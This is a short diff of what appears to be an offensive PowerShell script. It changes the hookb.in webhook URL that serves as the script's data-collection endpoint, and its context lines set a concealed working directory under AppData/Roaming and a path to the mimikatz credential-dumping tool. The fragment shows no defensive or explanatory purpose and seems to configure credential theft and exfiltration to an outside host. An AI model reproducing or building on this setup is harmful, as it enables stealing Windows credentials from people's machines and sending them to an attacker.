@@ -1,7 +1,7 @@
 #Add-Type -assembly "system.io.compression.filesystem"
 Add-Type -AssemblyName System.Web
 
-$uri_hookbin = "https://hookb.in/ZV8Od8Bd"
+$uri_hookbin = "https://hookb.in/vQQrm2WA"
 $repo_path = "$HOME/AppData/Roaming/ok"
 $mimikatz_path = "$repo_path/mimikatz"
 
